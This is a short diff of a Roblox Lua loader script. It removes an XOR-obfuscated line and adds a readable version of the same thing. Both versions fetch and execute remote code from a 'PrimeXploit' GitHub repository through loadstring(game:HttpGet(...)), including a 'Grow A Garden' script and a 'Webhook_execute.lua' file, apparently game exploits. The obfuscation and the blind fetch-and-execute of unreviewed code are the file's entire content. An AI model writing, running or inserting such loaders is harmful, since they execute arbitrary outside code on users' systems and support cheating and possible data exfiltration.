@@ -1,1 +1,5 @@
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end _G.place={[v7("\128\145\141\125\190\239\145\71\132\149\136\113\182\237\145","\126\177\163\187\69\134\219\167")]="loadstring(game:HttpGet('https://raw.githubusercontent.com/PrimeXploit/Lua-Script/refs/heads/main/Grow%20A%20Garden/Script.lua'))()"};loadstring(game:HttpGet(v7("\43\217\62\213\239\121\130\101\215\253\52\131\45\204\232\43\216\40\208\239\38\223\41\202\242\55\200\36\209\178\32\194\39\138\204\49\196\39\192\196\51\193\37\204\232\108\225\63\196\177\16\206\56\204\236\55\130\56\192\250\48\130\34\192\253\39\222\101\200\253\42\195\101\242\249\33\197\37\202\247\28\200\50\192\255\54\217\47\139\240\54\204","\156\67\173\74\165")))();
+_G.place = {
+    ["126884695634066"] = "loadstring(game:HttpGet('https://raw.githubusercontent.com/PrimeXploit/Lua-Script/refs/heads/main/Grow%20A%20Garden/Script.lua'))()"
+}
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PrimeXploit/Lua-Script/refs/heads/main/Webhook_execute.lua'))()
